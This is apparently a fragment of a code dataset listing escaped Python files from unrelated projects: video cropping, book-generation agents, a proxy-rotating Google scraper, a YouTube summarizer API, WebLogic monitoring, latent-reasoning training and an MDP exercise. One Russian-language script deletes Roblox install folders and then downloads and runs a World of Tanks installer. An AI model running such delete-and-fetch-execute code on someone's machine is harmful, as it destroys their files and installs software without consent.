print(f\"Video file {video_file} not found. Skipping...\")\n        return\n\n    video_name = os.path.splitext(video_file)[0]\n    video_frames_dir = os.path.join(output_frames_dir, video_name)\n    video_crops_dir = os.path.join(output_crops_dir, video_name)\n    create_directory(video_frames_dir)\n    create_directory(video_crops_dir)\n\n    print(f\"Processing video: {video_file}\")\n\n    cap = cv2.VideoCapture(input_video_path)\n    if not cap.isOpened():\n        print(f\"Error: Unable to open video file {video_file}\")\n        return\n\n    frame_rate = int(cap.get(cv2.CAP_PROP_FPS))\n    frame_count = int(cap.get(cv2.CAP_PROP_FRAME_COUNT))\n    print(f\"FPS: {frame_rate}, Total Frames: {frame_count}\")\n\n    cap.set(cv2.CAP_PROP_POS_FRAMES, starting_frame)\n    frame_idx = starting_frame\n\n    with tqdm(total=frame_count - starting_frame, desc=f\"Processing frames in {video_file}\", leave=False) as frame_pbar:\n        while True:\n            ret, frame = cap.read()\n            if not ret:\n                break\n\n            frame_file = os.path.join(video_frames_dir, f\"frame_{frame_idx:04d}.jpg\")\n            cv2.imwrite(frame_file, frame)\n\n            results = model.predict(frame, conf=0.5, verbose=False)\n            boxes = results[0].boxes\n\n            if boxes is not None:\n                for i, box in enumerate(boxes.xyxy.cpu().numpy()):\n                    x1, y1, x2, y2 = map(int, box[:4])\n                    x_center, y_center = (x1 + x2) // 2, (y1 + y2) // 2\n                    box_size = max(x2 - x1, y2 - y1) * 2  # Ensure 2x size\n\n                    # Ensure 1:1 aspect ratio with padding\n                    x1_ex",
    "\"\"\"Main script for running the book generation system\"\"\"\nfrom config import get_config\nfrom agents import BookAgents\nfrom book_generator import BookGenerator\nfrom outline_generator import OutlineGenerator\n\ndef main():\n    # Get configuration\n    agent_config = get_config()\n\n    \n    # Initial prompt for the book\n    initial_prompt = \"\"\"\n    Create a story in my established writing style with these key elements:\n    Its important that it has several key storylines that intersect and influence each other. The story should be set in a modern corporate environment, with a focus on technology and finance. The protagonist is a software engineer named Dane who has just completed a groundbreaking stock prediction algorithm. The algorithm predicts a catastrophic market crash, but Dane oversleeps and must rush to an important presentation to share his findings with executives. The tension arises from the questioning of whether his \"error\" might actually be correct.\n\n    The piece is written in third-person limited perspective, following Dane's thoughts and experiences. The prose is direct and technical when describing the protagonist's work, but becomes more introspective during personal moments. The author employs a mix of dialogue and internal monologue, with particular attention to time progression and technical details around the algorithm and stock predictions.\n    Story Arch:\n\n    Setup: Dane completes a groundbreaking stock prediction algorithm late at night\n    Initial Conflict: The algorithm predicts a catastrophic market crash\n    Rising Action: Dane oversleeps and must rush to an important presentation\n    Climax: The presentation to executives where he must explain his findings\n    Tension Point: The questioning of whether his \"error\" might actually be correct\n\n    Characters:\n\n    Dane: The protagonist; a dedicated software engineer who prioritizes work over personal life. Wears grey polo shirts on Thursdays, tends to get lost in his work, and struggles with work-life balance. More comfortable with code than public speaking.\n    Gary: Dane's nervous boss who seems caught between supporting Dane and managing upper management's expectations\n    Jonathan Morego: Senior VP of Investor Relations who raises pointed questions about the validity of Dane's predictions\n    Silence: Brief mention as an Uber driver\n    C-Level Executives: Present as an audience during the presentation\n\n    World Description:\n    The story takes place in a contemporary corporate setting, likely a financial technology company. The world appears to be our modern one, with familiar elements like:\n\n    Major tech companies (Tesla, Google, Apple, Microsoft)\n    Stock market and financial systems\n    Modern technology (neural networks, predictive analytics)\n    Urban environment with rideshare services like Uber\n    Corporate hierarchy and office culture\n\n    The story creates tension between the familiar corporate world and the potential for an unprecedented financial catastrophe, blending elements of technical thriller with workplace drama. The setting feels grounded in reality but hints at potentially apocalyptic economic consequences.\n    \"\"\"\n\n    num_chapters = 25\n    # Create agents\n    outline_agents = BookAgents(agent_config)\n    agents = outline_agents.create_agents(initial_prompt, num_chapters)\n    \n    # Generate the outline\n    outline_gen = OutlineGenerator(agents, agent_config)\n    print(\"Generating book outline...\")\n    outline = outline_gen.generate_outline(initial_prompt, num_chapters)\n    \n    # Create new agents with outline context\n    book_agents = BookAgents(agent_config, outline)\n    agents_with_context = book_agents.create_agents(initial_prompt, num_chapters)\n    \n    # Initialize book generator with contextual agents\n    book_gen = BookGenerator(agents_with_context, agent_config, outline)\n    \n    # Print the generated outline\n    print(\"\\nGenerated Outline:\")\n    for chapter in outline:\n        print(f\"\\nChapter {chapter['chapter_number']}: {chapter['title']}\")\n        print(\"-\" * 50)\n        print(chapter['prompt'])\n    \n    # Save the outline for reference\n    print(\"\\nSaving outline to file...\")\n    with open(\"book_output/outline.txt\", \"w\") as f:\n        for chapter in outline:\n            f.write(f\"\\nChapter {chapter['chapter_number']}: {chapter['title']}\\n\")\n            f.write(\"-\" * 50 + \"\\n\")\n            f.write(chapter['prompt'] + \"\\n\")\n    \n    # Generate the book using the outline\n    print(\"\\nGenerating book chapters...\")\n    if outline:\n        book_gen.generate_book(outline)\n    else:\n        print(\"Error: No outline was generated.\")\n\nif __name__ == \"__main__\":\n    main()",
    "import os\nimport pickle\nimport tkinter as tk\nfrom tkinter import filedialog, messagebox\nimport webbrowser\nimport requests\nfrom bs4 import BeautifulSoup\nimport pandas as pd\n\ndef get_script_dir():\n    try:\n        return os.path.dirname(os.path.abspath(__file__))\n    except NameError:\n        return os.getcwd()\n\ndef load_settings():\n    settings_file = os.path.join(get_script_dir(), 'settings.pkl')\n    if os.path.exists(settings_file):\n        with open(settings_file, 'rb') as f:\n            return pickle.load(f)\n    else:\n        return {\n            'user_agent': '',\n            'language': 'en',\n            'country': 'us',\n            'queries': [],\n            'proxies': []  # Each proxy includes IP, login, and password\n        }\n\ndef save_settings(settings):\n    settings_file = os.path.join(get_script_dir(), 'settings.pkl')\n    with open(settings_file, 'wb') as f:\n        pickle.dump(settings, f)\n\ndef search_google(settings):\n    headers = {'User-Agent': settings['user_agent']}\n    queries = settings['queries']\n    proxies = settings['proxies']\n    current_proxy_index = 0\n\n    results = []\n    for query in queries:\n        while True:\n            try:\n                if proxies:\n                    proxy_entry = proxies[current_proxy_index]\n                    proxy_url = proxy_entry['ip']\n                    if proxy_entry['login'] and proxy_entry['password']:\n                        proxy = {\n                            'http': f\"http://{proxy_entry['login']}:{proxy_entry['password']}@{proxy_url}\",\n                            'https': f\"https://{proxy_entry['login']}:{proxy_entry['password']}@{proxy_url}\"\n                        }\n                    else:\n                        proxy = {\n                            'http': f\"http://{proxy_url}\",\n                            'https': f\"https://{proxy_url}\"\n                        }\n                else:\n                    proxy = None\n\n                url = f\"https://www.google.com/search?q={query}&hl={settings['language']}&gl={settings['country']}\"\n                response = requests.get(url, headers=headers, proxies=proxy, timeout=5)\n                if response.status_code == 200:\n                    soup = BeautifulSoup(response.text, 'html.parser')\n                    search_results = soup.find_all('div', class_='tF2Cxc')\n                    results.append({\n                        'Title': f\"**{query}**\",\n                        'Link': '',\n                        'Snippet': ''\n                    })\n                    for result in search_results:\n                        title = result.find('h3')\n                        link = result.find('a', href=True)\n                        snippet = result.find('span', class_='aCOpRe')\n                        entry = {\n                            'Title': title.text if title else 'No title found',\n                            'Link': link['href'] if link else 'No link found',\n                            'Snippet': snippet.text if snippet else 'No snippet found'\n                        }\n                        results.append(entry)\n                    break  # Exit loop after successful parsing\n                else:\n                    raise Exception(\"Parsing error\")\n            except Exception:\n                current_proxy_index += 1\n                if current_proxy_index >= len(proxies):\n                    messagebox.showerror(\"Error\", f\"Failed to parse query '{query}' with all proxies.\")\n                    return\n                continue  # Switch to the next proxy\n\n    df = pd.DataFrame(results)\n    file_path = filedialog.asksaveasfilename(defaultextension=\".xlsx\", filetypes=[(\"Excel files\", \"*.xlsx\")], initialdir=get_script_dir())\n    if file_path:\n        writer = pd.ExcelWriter(file_path, engine='xlsxwriter')\n        df.to_excel(writer, index=False, sheet_name='Results')\n        workbook = writer.book\n        worksheet = writer.sheets['Results']\n\n        # Format bold text for query separators\n        bold_format = workbook.add_format({'bold': True})\n        for idx, row in df.iterrows():\n            if '**' in row['Title']:\n                worksheet.set_row(idx + 1, None, bold_format)\n\n        writer.close()\n        messagebox.showinfo(\"Information\", \"Results have been saved successfully.\")\n\ndef create_gui(settings):\n    window = tk.Tk()\n    window.title(\"Search Engine Parser Settings\")\n\n    tk.Label(window, text=\"User Agent:\").grid(row=0, column=0)\n    user_agent_entry = tk.Entry(window, width=50)\n    user_agent_entry.insert(0, settings['user_agent'])\n    user_agent_entry.grid(row=0, column=1)\n\n    link_label = tk.Label(window, text=\"Find your user agent at https://www.whatsmyua.info\", fg=\"blue\", cursor=\"hand2\")\n    link_label.grid(row=1, column=1)\n    link_label.bind(\"<Button-1>\", lambda e: webbrowser.open(\"https://www.whatsmyua.info\"))\n\n    tk.Label(window, text=\"Language (hl):\").grid(row=2, column=0)\n    language_entry = tk.Entry(window)\n    language_entry.insert(0, settings['language'])\n ",
    "from flask import Flask, request, jsonify\nfrom flask_cors import CORS\nfrom functools import wraps\nimport time\nimport dotenv\nfrom typing import Optional, Dict, Any\nimport os\nfrom youtube import VideoExtractor, Summarizer, validate_youtube_url\nimport traceback\n\napp = Flask(__name__)\napp.config['PROXY_URL'] = None  # Default value\n\ncors = CORS(app)  # Enable CORS for all routes\n\n# More specific CORS configuration\nCORS(app, resources={\n    r\"/api/*\": {\n        \"origins\": [\n            \"https://tldw.tube\",\n            \"http://localhost:5173\", # for local development\n        ],\n        \"methods\": [\"GET\", \"POST\", \"OPTIONS\"],\n    }\n})\n\n# Load environment variables\ndotenv.load_dotenv()\n\n# Rate limiting decorator\ndef rate_limit(limit=5):  # 60 requests per minute by default\n    def decorator(f):\n        requests = {}\n        \n        @wraps(f)\n        def wrapped(*args, **kwargs):\n            now = time.time()\n            ip = request.remote_addr\n            \n            # Clean old entries\n            requests[ip] = [t for t in requests.get(ip, []) if now - t < 60]\n            \n            if len(requests.get(ip, [])) >= limit:\n                return jsonify({\n                    \"error\": \"Rate limit exceeded. Please try again later.\"\n                }), 429\n            \n            requests.setdefault(ip, []).append(now)\n            return f(*args, **kwargs)\n        return wrapped\n    return decorator\n\n@app.route('/api/health', methods=['GET'])\ndef health_check():\n    return jsonify({\"status\": \"healthy\"}), 200\n\n@app.route('/api/summarize', methods=['POST'])\n@rate_limit()\ndef summarize_video():\n    data = request.get_json()\n    \n    if not data or 'url' not in data:\n        return jsonify({\n            \"error\": \"Missing URL in request body\"\n        }), 400\n    \n    url = data['url']\n    \n    if not validate_youtube_url(url):\n        return jsonify({\n            \"error\": \"Invalid YouTube URL\"\n        }), 400\n    \n    try:\n        extractor = VideoExtractor(proxy=app.config['PROXY_URL'])\n        summarizer = Summarizer()\n\n        # Download metadata\n        video_info = extractor.extract_video_info(url)\n        if not video_info:\n            return jsonify({\n                \"error\": \"Failed to download video info\"\n            }), 500\n\n        video_id = video_info['id']\n        duration = video_info['duration']\n\n        # If video too long, reject\n        print(f'Video id: {video_id}, duration: {duration} = {duration//60}:{duration%60:02}')\n        if duration >= 5400:\n            return jsonify({\n                \"error\": \"Too long video\"\n            }), 400\n\n        # Get captions\n        caption_track = extractor.get_captions_by_priority(video_info)\n        if not caption_track:\n            return jsonify({\n                'error': 'Captions are not available',\n                'video_id': video_id\n            }), 500\n        ext = caption_track['ext']\n        \n        app.logger.info(f'Using captions track: {caption_track[\"name\"]} ({ext})')\n        \n        # Download captions\n        downloaded_content = extractor.download_captions(video_id, caption_track)\n        \n        # Parse captions\n        caption_text = extractor.parse_captions(ext, downloaded_content)\n\n        print(f'Caption length: {len(caption_text)}')\n        \n        # Generate summaries\n        summaries = summarizer.summarize(caption_text, video_info)\n\n        if not summaries:\n            return jsonify({\n                \"error\": \"Failed to summarize\"\n            }), 500\n        \n        # Get the thumbnail with highest preference\n        thumbnails = video_info.get('thumbnails', [])\n        thumbnail_url = None\n        if thumbnails:\n            best_thumbnail = max(thumbnails, key=lambda x: x.get('preference', 0))\n            thumbnail_url = best_thumbnail.get('url')\n\n        aspect_ratio = video_info.get('aspect_ratio', 1.78)\n        webpage_url = video_info.get('webpage_url', 'https://www.youtube.com/watch?v=' + video_id)\n\n        return jsonify({\n            \"success\": True,\n            \"error\": \"\",\n            \"video_id\": video_id,\n            \"title\": video_info.get('title', ''),\n            \"thumbnail_url\": thumbnail_url,\n            \"aspect_ratio\": aspect_ratio,\n            \"webpage_url\": webpage_url,\n            \"summary\": summaries\n        }), 200\n        \n    except Exception as e:\n        app.logger.error(f\"Error processing video: {str(e)}\")\n        app.logger.error(traceback.format_exc())\n        return jsonify({\n            \"error\": f\"An error occurred: {str(e)}\"\n        }), 500\n\nif __name__ == '__main__':\n    from waitress import serve\n    import argparse\n    parser = argparse.ArgumentParser(description='Server configuration')\n    parser.add_argument('--port', type=int, default=5000, help='Port number (default: 5000)')\n    parser.add_argument('--proxy', default=os.getenv('PROXY_URL'), help='Proxy URL (default: PROXY_URL environment variable or None)')\n    args = parser.parse_args()\n    app.config['PROXY_URL'] = args.proxy\n    print",
    "import os\nimport sys\nfrom java.lang import System\n\ndef healthstat(server_name):\n    try:\n        cd('/ServerRuntimes/' + server_name + '/ThreadPoolRuntime/ThreadPoolRuntime')\n        health_state = get('HealthState')\n        return health_state.toString().split(',')[2].split(':')[1].split('HEALTH_')[1]\n    except:\n        return 'UNKNOWN'\n\ndef monitor_server_status(fo):\n    domainRuntime()\n    servers = domainRuntimeService.getServerRuntimes()\n    fo.write('<h2>SERVER STATUS REPORT</h2>')\n    fo.write('<table border=\"1\" style=\"width:100%\">')\n    fo.write('<tr bgcolor=\"#4477BB\"><th>Server Name</th><th>Status</th><th>Health</th></tr>')\n    \n    for server in servers:\n        status = server.getState()\n        health = healthstat(server.getName())\n        \n        status_color = '#90EE90' if status == 'RUNNING' else '#FFB6C6'\n        health_color = '#90EE90' if health == 'OK' else '#FFFF00' if health == 'WARN' else '#FFB6C6'\n        \n        fo.write('<tr bgcolor=\"#F4F6FA\">')\n        fo.write('<td>%s</td>' % server.getName())\n        fo.write('<td bgcolor=\"%s\">%s</td>' % (status_color, status))\n        fo.write('<td bgcolor=\"%s\">%s</td>' % (health_color, health))\n        fo.write('</tr>')\n    fo.write('</table>')\n\ndef monitor_heap_usage(fo):\n    fo.write('<h2>SERVER HEAP SIZE REPORT</h2>')\n    fo.write('<table border=\"1\" style=\"width:100%\">')\n    fo.write('<tr bgcolor=\"#4477BB\"><th>Managed Server</th><th>HeapFreeCurrent</th><th>HeapSizeCurrent</th><th>HeapFreePercent</th></tr>')\n    \n    servers = domainRuntimeService.getServerRuntimes()\n    for server in servers:\n        cd('/ServerRuntimes/%s/JVMRuntime/%s' % (server.getName(), server.getName()))\n        heap_free = float(get('HeapFreeCurrent')) / (1024 * 1024)\n        heap_size = float(get('HeapSizeCurrent')) / (1024 * 1024)\n        heap_free_pct = float(get('HeapFreePercent'))\n        \n        bgcolor = '#F4F6FA'\n        if heap_free_pct <= 20:\n            bgcolor = '#FFFF00' if heap_free_pct > 10 else '#FFB6C6'\n            \n        fo.write('<tr bgcolor=\"%s\">' % bgcolor)\n        fo.write('<td>%s</td>' % server.getName())\n        fo.write('<td>%.2f MB</td>' % heap_free)\n        fo.write('<td>%.2f MB</td>' % heap_size)\n        fo.write('<td>%.1f%%</td>' % heap_free_pct)\n        fo.write('</tr>')\n    fo.write('</table>')\n\ndef monitor_jdbc(fo):\n    fo.write('<h2>SERVER JDBC RUNTIME INFORMATION</h2>')\n    servers = domainRuntimeService.getServerRuntimes()\n    \n    for server in servers:\n        fo.write('<h3>%s</h3>' % server.getName())\n        fo.write('<table border=\"1\" style=\"width:100%\">')\n        fo.write('<tr bgcolor=\"#4477BB\"><th>Data Source</th><th>State</th><th>Active Connections</th><th>Waiting for Connections</th></tr>')\n        \n        try:\n            jdbc_runtime = server.getJDBCServiceRuntime()\n            datasources = jdbc_runtime.getJDBCDataSourceRuntimeMBeans()\n            \n            for ds in datasources:\n                state_color = '#FFB6C6' if ds.getState() != \"Running\" else '#F4F6FA'\n                active_conn = ds.getActiveConnectionsCurrentCount()\n                waiting_conn = ds.getWaitingForConnectionCurrentCount()\n                \n                fo.write('<tr bgcolor=\"%s\">' % state_color)\n                fo.write('<td>%s</td>' % ds.getName())\n                fo.write('<td>%s</td>' % ds.getState())\n                fo.write('<td>%d</td>' % active_conn)\n                fo.write('<td>%d</td>' % waiting_conn)\n                fo.write('</tr>')\n        except:\n            fo.write('<tr><td colspan=\"4\">No JDBC resources found</td></tr>')\n        fo.write('</table>')\n\ndef monitor_jms(fo):\n    fo.write('<h2>SERVER JMS STATUS INFORMATION</h2>')\n    servers = domainRuntimeService.getServerRuntimes()\n    \n    for server in servers:\n        fo.write('<h3>JMS Runtime Info for: %s</h3>' % server.getName())\n        fo.write('<table border=\"1\" style=\"width:100%\">')\n        fo.write('''<tr bgcolor=\"#4477BB\">\n            <th>SERVER</th>\n            <th>JMSSERVER</th>\n            <th>DestinationName</th>\n            <th>DestinationType</th>\n            <th>MessagesCurrentCount</th>\n            <th>MessagesHighCount</th>\n            <th>ConsumersCurrentCount</th>\n            <th>ConsumersHighCount</th>\n            <th>ConsumersTotalCount</th>\n            </tr>''')\n        \n        try:\n            jms_runtime = server.getJMSRuntime()\n            jms_servers = jms_runtime.getJMSServers() if jms_runtime else []\n            \n            if jms_servers and len(jms_servers) > 0:\n                row_count = 0\n                for jms_server in jms_servers:\n                    destinations = jms_server.getDestinations()\n                    if destinations and len(destinations) > 0:\n                        for dest in destinations:\n                            bgcolor = '#F4F6FA' if row_count % 2 == 0 else '#E6E6FA'\n                            dest_name = dest.getName()\n                            \n                            fo.write('<tr bgcolor=\"%s\">' %",
    "import torch\nimport torch.nn as nn\nfrom transformers import AutoModelForCausalLM, AutoTokenizer\nfrom torch.utils.data import DataLoader, Dataset\nfrom datasets import load_dataset\nfrom tqdm import tqdm\n\n# Dataset Preparation\nclass GSM8kDataset(Dataset):\n    def __init__(self, tokenizer, stage, c, max_length):\n        '''\n            stage: \u53bb\u9664\u524dstage\u4e2areasoning steps\n        '''\n        ds = load_dataset(\"openai/gsm8k\", \"main\")\n        self.data = []\n        for ex in ds['train']:\n            question = ex['question']\n            \n            # answer#### \u540e\u7684\u90e8\u5206\n            answer = ex['answer'].split('#### ')[1].strip()\n            \n            # steps\u4e3a\u6240\u6709<< >>\u5185\u7684\u90e8\u5206\uff0c\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\n            import re\n            steps = re.findall(r\"<<(.*?)>>\", ex['answer'])\n\n            self.data.append((question, steps, answer))\n        self.tokenizer = tokenizer\n        self.stage = stage\n        self.latent_steps = stage * c\n        self.max_length = max_length\n\n    def __len__(self):\n        return len(self.data)\n\n    def __getitem__(self, idx):\n        question, reasoning_steps, answer = self.data[idx]\n        # print(f\"Question: {question}\\nReasoning Steps: {reasoning_steps}\\nAnswer: {answer}\")\n\n        stage_reasoning_steps = reasoning_steps[self.stage : ] if self.stage < len(reasoning_steps) else []\n\n        before_bot = f\"Question: {question}\\n\\nReasoning:<bot>\"\n        after_eot = f\"<eot>{stage_reasoning_steps}\\n\\nAnswer: {answer}\"\n\n        before_bot_text = self.tokenizer(\n            before_bot,\n            truncation=True,\n            max_length=self.max_length,\n            return_tensors=\"pt\",\n            padding=\"max_length\",\n        )\n        after_eot_text = self.tokenizer(\n            after_eot,\n            truncation=True,\n            max_length=self.max_length,\n            return_tensors=\"pt\",\n            padding=\"max_length\",\n        )\n        # print(before_bot_text)\n        before_bot_position_ids = torch.cumsum(before_bot_text.attention_mask, dim=1) - 1\n        after_eot_position_ids = before_bot_position_ids[:, -1] + self.latent_steps + torch.cumsum(after_eot_text.attention_mask, dim=1)\n\n        after_eot_attention_mask = torch.cat([\n                                                before_bot_text.attention_mask, \n                                                torch.ones((before_bot_text.attention_mask.size(0), self.latent_steps), device=before_bot_text.attention_mask.device),\n                                                after_eot_text.attention_mask\n                                            ], dim=1)\n        return {\n            \"before_bot\": before_bot_text.input_ids.squeeze(0),\n            \"after_eot\": after_eot_text.input_ids.squeeze(0),\n            \"before_bot_attention\": before_bot_text.attention_mask.squeeze(0),\n            \"after_eot_attention\": after_eot_attention_mask.squeeze(0),\n            \"before_bot_position_ids\": before_bot_position_ids.squeeze(0),\n            \"after_eot_position_ids\": after_eot_position_ids.squeeze(0),\n        }\n\n# Define the Model Wrapper with Latent Mode\nclass CoconutModel(nn.Module):\n    def __init__(self, base_model_name):\n        super(CoconutModel, self).__init__()\n        self.model = AutoModelForCausalLM.from_pretrained(base_model_name, device_map=device, torch_dtype=torch.bfloat16)\n\n    def forward(self, input_ids, attention_mask, position_ids=None, latent_steps=0):\n        outputs = self.model.model(\n                               input_ids, \n                               attention_mask=attention_mask, \n                               use_cache=True,\n                               position_ids=position_ids,\n                               output_hidden_states=True,\n                            )\n        kv_cache = outputs.past_key_values\n        hidden_states = outputs.last_hidden_state\n        next_position_ids = position_ids[:, -1:]\n        next_mask = attention_mask[:, :]\n        for _ in range(latent_steps):\n            next_input = hidden_states[:, -1, :].unsqueeze(1)  # Use last hidden state as input embedding\n            next_position_ids = next_position_ids + 1\n            next_mask = torch.cat([next_mask, torch.ones((next_mask.size(0), 1), device=next_mask.device)], dim=1)\n            outputs = self.model.model(\n                                    inputs_embeds=next_input, \n                                    past_key_values=kv_cache, \n                                    use_cache=True,\n                                    position_ids=next_position_ids,\n                                    output_hidden_states=True,\n                                )\n            hidden_states = outputs.last_hidden_state\n            kv_cache = outputs.past_key_values\n\n        return hidden_states, kv_cache\n\n# Multi-Stage Training with Gradual Replacement of Reasoning Steps\ndef train_multistage_model(model, stages, c=1):\n    for stage in stages:\n        dataset = GSM8kDataset(tokenizer, stage['stage'], c, max_length)\n        dataloader = DataLoader(dataset, batch_size=batch_si",
    "import os\r\nimport shutil\r\nimport requests\r\nimport subprocess\r\n\r\ndef delete_roblox():\r\n    roblox_paths = [\r\n        os.path.join(os.environ['LOCALAPPDATA'], 'Roblox'),\r\n        os.path.join(os.environ['PROGRAMFILES'], 'Roblox'),\r\n        os.path.join(os.environ['PROGRAMFILES(X86)'], 'Roblox')\r\n    ]\r\n    \r\n    for path in roblox_paths:\r\n        if os.path.exists(path):\r\n            try:\r\n                shutil.rmtree(path)\r\n                print(f'\u0420\u043e\u0431\u043b\u043e\u043a\u0441 \u0443\u0441\u043f\u0435\u0448\u043d\u043e \u0443\u0434\u0430\u043b\u0435\u043d \u0438\u0437 {path}')\r\n            except Exception as e:\r\n                print(f'\u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0438 \u0443\u0434\u0430\u043b\u0435\u043d\u0438\u0438 \u0420\u043e\u0431\u043b\u043e\u043a\u0441: {e}')\r\n\r\ndef download_tanks():\r\n    tanks_url = \"https://redirect.wargaming.net/WoT/latest_web_install_na\"\r\n    save_path = os.path.join(os.environ['TEMP'], 'wot_install.exe')\r\n    \r\n    try:\r\n        print('\u041d\u0430\u0447\u0438\u043d\u0430\u0435\u043c \u0437\u0430\u0433\u0440\u0443\u0437\u043a\u0443 World of Tanks...')\r\n        response = requests.get(tanks_url, stream=True)\r\n        with open(save_path, 'wb') as f:\r\n            for chunk in response.iter_content(chunk_size=8192):\r\n                f.write(chunk)\r\n        \r\n        print('\u0417\u0430\u043f\u0443\u0441\u043a\u0430\u0435\u043c \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u0449\u0438\u043a World of Tanks...')\r\n        subprocess.run([save_path])\r\n        \r\n    except Exception as e:\r\n        print(f'\u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0438 \u0441\u043a\u0430\u0447\u0438\u0432\u0430\u043d\u0438\u0438/\u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0435 World of Tanks: {e}')\r\n\r\nif __name__ == '__main__':\r\n    print('\u041d\u0430\u0447\u0438\u043d\u0430\u0435\u043c \u043f\u0440\u043e\u0446\u0435\u0441\u0441 \u0437\u0430\u043c\u0435\u043d\u044b \u0420\u043e\u0431\u043b\u043e\u043a\u0441 \u043d\u0430 World of Tanks...')\r\n    delete_roblox()\r\n    download_tanks()\r\n    print('\u041f\u0440\u043e\u0446\u0435\u0441\u0441 \u0437\u0430\u0432\u0435\u0440\u0448\u0435\u043d!')\r\n",
    "import numpy as np\n\nS = [\"s1\", \"s2\", \"s3\", \"s4\", \"s5\"]  # \u72b6\u6001\u96c6\u5408\nA = [\"\u4fdd\u6301s1\", \"\u524d\u5f80s1\", \"\u524d\u5f80s2\", \"\u524d\u5f80s3\", \"\u524d\u5f80s4\", \"\u524d\u5f80s5\", \"\u6982\u7387\u524d\u5f80\"]  # \u52a8\u4f5c\u96c6\u5408\n# \u72b6\u6001\u8f6c\u79fb\u51fd\u6570 P(s'|s,a)\nP = {\n    \"s1-\u4fdd\u6301s1-s1\": 1.0,\n    \"s1-\u524d\u5f80s2-s2\": 1.0,\n    \"s2-\u524d\u5f80s1-s1\": 1.0,\n    \"s2-\u524d\u5f80s3-s3\": 1.0,\n    \"s3-\u524d\u5f80s4-s4\": 1.0,\n    \"s3-\u524d\u5f80s5-s5\": 1.0,\n    \"s4-\u524d\u5f80s5-s5\": 1.0,\n    \"s4-\u6982\u7387\u524d\u5f80-s2\": 0.2,\n    \"s4-\u6982\u7387\u524d\u5f80-s3\": 0.4,\n    \"s4-\u6982\u7387\u524d\u5f80-s4\": 0.4,\n}\n# \u5956\u52b1\u51fd\u6570 R(s, a)\nR = {\n    \"s1-\u4fdd\u6301s1\": -1,\n    \"s1-\u524d\u5f80s2\": 0,\n    \"s2-\u524d\u5f80s1\": -1,\n    \"s2-\u524d\u5f80s3\": -2,\n    \"s3-\u524d\u5f80s4\": -2,\n    \"s3-\u524d\u5f80s5\": 0,\n    \"s4-\u524d\u5f80s5\": 10,\n    \"s4-\u6982\u7387\u524d\u5f80\": 1,\n}\ngamma = 0.5  # \u6298\u6263\u56e0\u5b50\nMDP = (S, A, P, R, gamma)\n\n# \u7b56\u75651,\u968f\u673a\u7b56\u7565\nPi_1 = {\n    \"s1-\u4fdd\u6301s1\": 0.5,\n    \"s1-\u524d\u5f80s2\": 0.5,\n    \"s2-\u524d\u5f80s1\": 0.5,\n    \"s2-\u524d\u5f80s3\": 0.5,\n    \"s3-\u524d\u5f80s4\": 0.5,\n    \"s3-\u524d\u5f80s5\": 0.5,\n    \"s4-\u524d\u5f80s5\": 0.5,\n    \"s4-\u6982\u7387\u524d\u5f80\": 0.5,\n}\n# \u7b56\u75652\nPi_2 = {\n    \"s1-\u4fdd\u6301s1\": 0.6,\n    \"s1-\u524d\u5f80s2\": 0.4,\n    \"s2-\u524d\u5f80s1\": 0.3,\n    \"s2-\u524d\u5f80s3\": 0.7,\n    \"s3-\u524d\u5f80s4\": 0.5,\n    \"s3-\u524d\u5f80s5\": 0.5,\n    \"s4-\u524d\u5f80s5\": 0.1,\n    \"s4-\u6982\u7387\u524d\u5f80\": 0.9,\n}\n\n\n# \u628a\u8f93\u5165\u7684\u4e24\u4e2a\u5b57\u7b26\u4e32\u901a\u8fc7\u201c-\u201d\u8fde\u63a5,\u4fbf\u4e8e\u4f7f\u7528\u4e0a\u8ff0\u5b9a\u4e49\u7684P\u3001R\u53d8\u91cf\ndef join(str1, str2):\n    return str1 + \"-\" + str2\n\n\ndef compute_v(P, rewards, gamma, states_num):\n    \"\"\"\n    \u7ed9\u5b9aMRP\uff0c\u8ba1\u7b97\u4ef7\u503c\u51fd\u6570\uff0c\u5229\u7528\u8d1d\u5c14\u66fc\u65b9\u7a0b\u7684\u77e9\u9635\u5f62\u5f0f\u8ba1\u7b97\u89e3\u6790\u89e3, states_num\u662fMRP\u7684\u72b6\u6001\u6570\n    \"\"\"\n    rewards = np.array(rewards).reshape((-1, 1))  # \u5c06rewards\u5199\u6210\u5217\u5411\u91cf\u5f62\u5f0f\n    value = np.dot(np.linalg.inv(np.eye(states_num, states_num) - gamma * P), rewards)\n    return value\n\n\ndef compute_state_transition_matrix(S, A, P, Pi):\n    \"\"\"\n    \u8ba1\u7b97\u4eceMDP\u8f6c\u6362\u5230MRP\u7684\u72b6\u6001\u8f6c\u79fb\u77e9\u9635\n\n    \u53c2\u6570:\n    S: \u72b6\u6001\u96c6\u5408\n    A: \u52a8\u4f5c\u96c6\u5408\n    P: MDP\u7684\u72b6\u6001\u8f6c\u79fb\u51fd\u6570\u5b57\u5178 P(s'|s,a)\n    Pi: \u7b56\u7565\u5b57\u5178 Pi(a|s)\n\n    \u8fd4\u56de:\n    P_mrp: numpy\u6570\u7ec4\uff0c\u8868\u793aMRP\u7684\u72b6\u6001\u8f6c\u79fb\u77e9\u9635\n    \"\"\"\n    n = len(S)  # \u72b6\u6001\u6570\u91cf\n    P_mrp = np.zeros((n, n))  # \u521d\u59cb\u5316\u72b6\u6001\u8f6c\u79fb\u77e9\u9635\n\n    # \u5efa\u7acb\u72b6\u6001\u7d22\u5f15\u5b57\u5178\uff0c\u65b9\u4fbf\u540e\u7eed\u4f7f\u7528\n    state_to_idx = {state: idx for idx, state in enumerate(S)}\n\n    # \u904d\u5386\u6bcf\u4e2a\u72b6\u6001\u548c\u52a8\u4f5c\n    for s in S:\n        for a in A:\n            # \u83b7\u53d6\u5f53\u524d\u72b6\u6001-\u52a8\u4f5c\u5bf9\u7684\u7b56\u7565\u6982\u7387\n            pi_key = join(s, a)\n            if pi_key in Pi:\n                pi_prob = Pi[pi_key]\n\n                # \u904d\u5386\u6240\u6709\u53ef\u80fd\u7684\u4e0b\u4e00\u4e2a\u72b6\u6001\n                for s_next in S:\n                    # \u6784\u9020\u72b6\u6001\u8f6c\u79fb\u7684key\n                    p_key = join(join(s, a), s_next)\n\n                    # \u5982\u679c\u5b58\u5728\u8fd9\u4e2a\u8f6c\u79fb\u6982\u7387\n                    if p_key in P:\n                        i = state_to_idx[s]  # \u5f53\u524d\u72b6\u6001\u7d22\u5f15\n                        j = 